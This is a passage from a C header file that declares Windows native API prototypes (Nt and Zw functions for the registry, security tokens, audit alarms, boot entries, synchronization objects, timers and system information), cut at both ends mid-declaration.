    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtFlushKey(
    IN HANDLE KeyHandle
    );


NTSTATUS
NTAPI
NtInitializeRegistry(
    IN USHORT BootCondition
    );


NTSTATUS
NTAPI
NtNotifyChangeKey(
    IN HANDLE KeyHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );


NTSTATUS
NTAPI
NtNotifyChangeMultipleKeys(
    IN HANDLE MasterKeyHandle,
    IN OPTIONAL ULONG Count,
    IN OPTIONAL OBJECT_ATTRIBUTES SlaveObjects[],
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );


NTSTATUS
NTAPI
NtLoadKey(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile
    );


NTSTATUS
NTAPI
NtLoadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtLoadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags,
    IN OPTIONAL HANDLE TrustClassKey
    );


NTSTATUS
NTAPI
NtOpenKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryKey(
    IN HANDLE KeyHandle,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtQueryValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtQueryMultipleValueKey(
    IN HANDLE KeyHandle,
    IN OUT PKEY_VALUE_ENTRY ValueEntries,
    IN ULONG EntryCount,
    OUT PVOID ValueBuffer,
    IN OUT PULONG BufferLength,
    OUT OPTIONAL PULONG RequiredBufferLength
    );


NTSTATUS
NTAPI
NtReplaceKey(
    IN POBJECT_ATTRIBUTES NewFile,
    IN HANDLE TargetHandle,
    IN POBJECT_ATTRIBUTES OldFile
    );


NTSTATUS
NTAPI
NtRenameKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING  NewName
    );


NTSTATUS
NTAPI
NtCompactKeys(
    IN ULONG Count,
    IN HANDLE KeyArray[]
            );


NTSTATUS
NTAPI
NtCompressKey(
    IN HANDLE Key
            );


NTSTATUS
NTAPI
NtRestoreKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtSaveKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle
    );


NTSTATUS
NTAPI
NtSaveKeyEx(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG  Format
    );


NTSTATUS
NTAPI
NtSaveMergedKeys(
    IN HANDLE HighPrecedenceKeyHandle,
    IN HANDLE LowPrecedenceKeyHandle,
    IN HANDLE FileHandle
    );


NTSTATUS
NTAPI
NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN OPTIONAL ULONG TitleIndex,
    IN ULONG Type,
    IN OPTIONAL PVOID Data,
    IN ULONG DataSize
    );


NTSTATUS
NTAPI
NtUnloadKey(
    IN POBJECT_ATTRIBUTES TargetKey
    );


NTSTATUS
NTAPI
NtUnloadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtUnloadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN OPTIONAL HANDLE Event
    );


NTSTATUS
NTAPI
NtSetInformationKey(
    IN HANDLE KeyHandle,
    IN KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    IN PVOID KeySetInformation,
    IN ULONG KeySetInformationLength
    );


NTSTATUS
NTAPI
NtQueryOpenSubKeys(
    IN POBJECT_ATTRIBUTES TargetKey,
    OUT PULONG  HandleCount
    );


NTSTATUS
NTAPI
NtQueryOpenSubKeysEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG BufferLength,
    OUT PVOID Buffer,
    OUT PULONG RequiredSize
    );


NTSTATUS
NTAPI
NtLockRegistryKey(
    IN HANDLE KeyHandle
    );


NTSTATUS
NTAPI
NtLockProductActivationKeys(
    IN OUT OPTIONAL ULONG *pPrivateVer,
    OUT OPTIONAL ULONG *pSafeMode
    );


NTSTATUS
NTAPI
NtAccessCheck (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );


NTSTATUS
NTAPI
NtAccessCheckByType (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeResultList (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );


NTSTATUS
NTAPI
NtCreateToken(
    OUT PHANDLE TokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TOKEN_TYPE TokenType,
    IN PLUID AuthenticationId,
    IN PLARGE_INTEGER ExpirationTime,
    IN PTOKEN_USER User,
    IN PTOKEN_GROUPS Groups,
    IN PTOKEN_PRIVILEGES Privileges,
    IN OPTIONAL PTOKEN_OWNER Owner,
    IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
    IN OPTIONAL PTOKEN_DEFAULT_DACL DefaultDacl,
    IN PTOKEN_SOURCE TokenSource
    );


NTSTATUS
NTAPI
NtCompareTokens(
    IN HANDLE FirstTokenHandle,
    IN HANDLE SecondTokenHandle,
    OUT PBOOLEAN Equal
    );


NTSTATUS
NTAPI
NtOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtOpenThreadTokenEx(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtOpenProcessTokenEx(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );


NTSTATUS
NTAPI
NtDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle
    );


NTSTATUS
NTAPI
NtFilterToken (
    IN HANDLE ExistingTokenHandle,
    IN ULONG Flags,
    IN OPTIONAL PTOKEN_GROUPS SidsToDisable,
    IN OPTIONAL PTOKEN_PRIVILEGES PrivilegesToDelete,
    IN OPTIONAL PTOKEN_GROUPS RestrictedSids,
    OUT PHANDLE NewTokenHandle
    );


NTSTATUS
NTAPI
NtImpersonateAnonymousToken(
    IN HANDLE ThreadHandle
    );


NTSTATUS
NTAPI
NtQueryInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID TokenInformation,
    IN ULONG TokenInformationLength,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    IN PVOID TokenInformation,
    IN ULONG TokenInformationLength
    );


NTSTATUS
NTAPI
NtAdjustPrivilegesToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN OPTIONAL PTOKEN_PRIVILEGES NewState,
    IN OPTIONAL ULONG BufferLength,
    OUT PTOKEN_PRIVILEGES PreviousState,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtAdjustGroupsToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN ResetToDefault,
    IN PTOKEN_GROUPS NewState ,
    IN OPTIONAL ULONG BufferLength ,
    OUT PTOKEN_GROUPS PreviousState ,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtPrivilegeCheck (
    IN HANDLE ClientToken,
    IN OUT  PPRIVILEGE_SET RequiredPrivileges,
    OUT PBOOLEAN Result
    );


NTSTATUS
NTAPI
NtAccessCheckAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeResultListAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtAccessCheckByTypeResultListAndAuditAlarmByHandle (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtOpenObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN OPTIONAL PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN ACCESS_MASK GrantedAccess,
    IN OPTIONAL PPRIVILEGE_SET Privileges,
    IN BOOLEAN ObjectCreation,
    IN BOOLEAN AccessGranted,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtPrivilegeObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
NtCloseObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtDeleteObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
NtPrivilegedServiceAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN PUNICODE_STRING ServiceName,
    IN HANDLE ClientToken,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
NtContinue (
    IN PCONTEXT ContextRecord,
    IN BOOLEAN TestAlert
    );


NTSTATUS
NTAPI
NtRaiseException (
    IN PEXCEPTION_RECORD ExceptionRecord,
    IN PCONTEXT ContextRecord,
    IN BOOLEAN FirstChance
    );

// end_ntapi


// begin_zwapi
NTSTATUS
NTAPI
ZwDelayExecution (
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval
    );



NTSTATUS
NTAPI
ZwQuerySystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    OUT PWSTR VariableValue,
    IN USHORT ValueLength,
    OUT OPTIONAL PUSHORT ReturnLength
    );



NTSTATUS
NTAPI
ZwSetSystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    IN PUNICODE_STRING VariableValue
    );



NTSTATUS
NTAPI
ZwQuerySystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    OUT OPTIONAL PVOID Value,
    IN OUT PULONG ValueLength,
    OUT OPTIONAL PULONG Attributes
    );



NTSTATUS
NTAPI
ZwSetSystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    IN OPTIONAL PVOID Value,
    IN ULONG ValueLength,
    IN ULONG Attributes
    );



NTSTATUS
NTAPI
ZwEnumerateSystemEnvironmentValuesEx (
    IN ULONG InformationClass,
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );



NTSTATUS
NTAPI
ZwAddBootEntry (
    IN PBOOT_ENTRY BootEntry,
    OUT OPTIONAL PULONG Id
    );



NTSTATUS
NTAPI
ZwDeleteBootEntry (
    IN ULONG Id
    );



NTSTATUS
NTAPI
ZwModifyBootEntry (
    IN PBOOT_ENTRY BootEntry
    );



NTSTATUS
NTAPI
ZwEnumerateBootEntries (
    OUT OPTIONAL PVOID Buffer,
    IN OUT PULONG BufferLength
    );



NTSTATUS
NTAPI
ZwQueryBootEntryOrder (
    OUT OPTIONAL PULONG Ids,
    IN OUT PULONG Count
    );



NTSTATUS
NTAPI
ZwSetBootEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );



NTSTATUS
NTAPI
ZwQueryBootOptions (
    OUT OPTIONAL PBOOT_OPTIONS BootOptions,
    IN OUT PULONG BootOptionsLength
    );



NTSTATUS
NTAPI
ZwSetBootOptions (
    IN PBOOT_OPTIONS BootOptions,
    IN ULONG FieldsToChange
    );



NTSTATUS
NTAPI
ZwTranslateFilePath (
    IN PFILE_PATH InputFilePath,
    IN ULONG OutputType,
    OUT OPTIONAL PFILE_PATH OutputFilePath,
    IN OUT OPTIONAL PULONG OutputFilePathLength
    );



NTSTATUS
NTAPI
ZwAddDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry,
    OUT OPTIONAL PULONG Id
    );



NTSTATUS
NTAPI
ZwDeleteDriverEntry (
    IN ULONG Id
    );



NTSTATUS
NTAPI
ZwModifyDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry
    );



NTSTATUS
NTAPI
ZwEnumerateDriverEntries (
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );



NTSTATUS
NTAPI
ZwQueryDriverEntryOrder (
    OUT PULONG Ids,
    IN OUT PULONG Count
    );



NTSTATUS
NTAPI
ZwSetDriverEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );



NTSTATUS
NTAPI
ZwClearEvent (
    IN HANDLE EventHandle
    );



NTSTATUS
NTAPI
ZwCreateEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState
    );



NTSTATUS
NTAPI
ZwOpenEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwPulseEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );



NTSTATUS
NTAPI
ZwQueryEvent (
    IN HANDLE EventHandle,
    IN EVENT_INFORMATION_CLASS EventInformationClass,
    OUT PVOID EventInformation,
    IN ULONG EventInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwResetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );



NTSTATUS
NTAPI
ZwSetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );



NTSTATUS
NTAPI
ZwSetEventBoostPriority (
    IN HANDLE EventHandle
    );



NTSTATUS
NTAPI
ZwCreateEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwOpenEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwWaitLowEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwWaitHighEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetLowWaitHighEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetHighWaitLowEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetLowEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwSetHighEventPair (
    IN HANDLE EventPairHandle
    );



NTSTATUS
NTAPI
ZwCreateMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN InitialOwner
    );



NTSTATUS
NTAPI
ZwOpenMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryMutant (
    IN HANDLE MutantHandle,
    IN MUTANT_INFORMATION_CLASS MutantInformationClass,
    OUT PVOID MutantInformation,
    IN ULONG MutantInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwReleaseMutant (
    IN HANDLE MutantHandle,
    OUT OPTIONAL PLONG PreviousCount
    );



NTSTATUS
NTAPI
ZwCreateSemaphore (
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN LONG InitialCount,
    IN LONG MaximumCount
    );



NTSTATUS
NTAPI
ZwOpenSemaphore(
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQuerySemaphore (
    IN HANDLE SemaphoreHandle,
    IN SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    OUT PVOID SemaphoreInformation,
    IN ULONG SemaphoreInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwReleaseSemaphore(
    IN HANDLE SemaphoreHandle,
    IN LONG ReleaseCount,
    OUT OPTIONAL PLONG PreviousCount
    );



NTSTATUS
NTAPI
ZwCreateTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TIMER_TYPE TimerType
    );



NTSTATUS
NTAPI
ZwOpenTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwCancelTimer (
    IN HANDLE TimerHandle,
    OUT OPTIONAL PBOOLEAN CurrentState
    );



NTSTATUS
NTAPI
ZwQueryTimer (
    IN HANDLE TimerHandle,
    IN TIMER_INFORMATION_CLASS TimerInformationClass,
    OUT PVOID TimerInformation,
    IN ULONG TimerInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetTimer (
    IN HANDLE TimerHandle,
    IN PLARGE_INTEGER DueTime,
    IN OPTIONAL PTIMER_APC_ROUTINE TimerApcRoutine,
    IN OPTIONAL PVOID TimerContext,
    IN BOOLEAN ResumeTimer,
    IN OPTIONAL LONG Period,
    OUT OPTIONAL PBOOLEAN PreviousState
    );



NTSTATUS
NTAPI
ZwQuerySystemTime (
    OUT PLARGE_INTEGER SystemTime
    );



NTSTATUS
NTAPI
ZwSetSystemTime (
    IN OPTIONAL PLARGE_INTEGER SystemTime,
    OUT OPTIONAL PLARGE_INTEGER PreviousTime
    );



NTSTATUS
NTAPI
ZwQueryTimerResolution (
    OUT PULONG MaximumTime,
    OUT PULONG MinimumTime,
    OUT PULONG CurrentTime
    );



NTSTATUS
NTAPI
ZwSetTimerResolution (
    IN ULONG DesiredTime,
    IN BOOLEAN SetResolution,
    OUT PULONG ActualTime
    );



NTSTATUS
NTAPI
ZwAllocateLocallyUniqueId (
    OUT PLUID Luid
    );



NTSTATUS
NTAPI
ZwSetUuidSeed (
    IN PCHAR Seed
    );



NTSTATUS
NTAPI
ZwAllocateUuids (
    OUT PULARGE_INTEGER Time,
    OUT PULONG Range,
    OUT PULONG Sequence,
    OUT PCHAR Seed
    );



NTSTATUS
NTAPI
ZwCreateProfile (
    OUT PHANDLE ProfileHandle,
    IN HANDLE Process OPTIONAL,
    IN PVOID ProfileBase,
    IN SIZE_T ProfileSize,
    IN ULONG BucketSize,
    IN PULONG Buffer,
    IN ULONG BufferSize,
    IN KPROFILE_SOURCE ProfileSource,
    IN KAFFINITY Affinity
    );



NTSTATUS
NTAPI
ZwStartProfile (
    IN HANDLE ProfileHandle
    );



NTSTATUS
NTAPI
ZwStopProfile (
    IN HANDLE ProfileHandle
    );



NTSTATUS
NTAPI
ZwSetIntervalProfile (
    IN ULONG Interval,
    IN KPROFILE_SOURCE Source
    );



NTSTATUS
NTAPI
ZwQueryIntervalProfile (
    IN KPROFILE_SOURCE ProfileSource,
    OUT PULONG Interval
    );



NTSTATUS
NTAPI
ZwQueryPerformanceCounter (
    OUT PLARGE_INTEGER PerformanceCounter,
    OUT OPTIONAL PLARGE_INTEGER PerformanceFrequency
    );



NTSTATUS
NTAPI
ZwCreateKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwOpenKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwReleaseKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwQuerySystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetSystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength
    );



NTSTATUS
NTAPI
ZwSystemDebugControl (
    IN SYSDBG_COMMAND Command,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwRaiseHardError (
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN ULONG UnicodeStringParameterMask,
    IN OPTIONAL PULONG_PTR Parameters,
    IN ULONG ValidResponseOptions,
    OUT PULONG Response
    );



NTSTATUS
NTAPI
ZwQueryDefaultLocale (
    IN BOOLEAN UserProfile,
    OUT PLCID DefaultLocaleId
    );



NTSTATUS
NTAPI
ZwSetDefaultLocale (
    IN BOOLEAN UserProfile,
    IN LCID DefaultLocaleId
    );



NTSTATUS
NTAPI
ZwQueryInstallUILanguage (
    OUT LANGID *InstallUILanguageId
    );



NTSTATUS
NTAPI
ZwQueryDefaultUILanguage (
    OUT LANGID *DefaultUILanguageId
    );



NTSTATUS
NTAPI
ZwSetDefaultUILanguage (
    IN LANGID DefaultUILanguageId
    );



NTSTATUS
NTAPI
ZwSetDefaultHardErrorPort(
    IN HANDLE DefaultHardErrorPort
    );



NTSTATUS
NTAPI
ZwShutdownSystem (
    IN SHUTDOWN_ACTION Action
    );



NTSTATUS
NTAPI
ZwDisplayString (
    IN PUNICODE_STRING String
    );



NTSTATUS
NTAPI
ZwAddAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );



NTSTATUS
NTAPI
ZwFindAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );



NTSTATUS
NTAPI
ZwDeleteAtom (
    IN RTL_ATOM Atom
    );



NTSTATUS
NTAPI
ZwQueryInformationAtom(
    IN RTL_ATOM Atom,
    IN ATOM_INFORMATION_CLASS AtomInformationClass,
    OUT OPTIONAL PVOID AtomInformation,
    IN ULONG AtomInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwCancelIoFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );



NTSTATUS
NTAPI
ZwCreateNamedPipeFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG ShareAccess,
     IN ULONG CreateDisposition,
     IN ULONG CreateOptions,
     IN ULONG NamedPipeType,
     IN ULONG ReadMode,
     IN ULONG CompletionMode,
     IN ULONG MaximumInstances,
     IN ULONG InboundQuota,
     IN ULONG OutboundQuota,
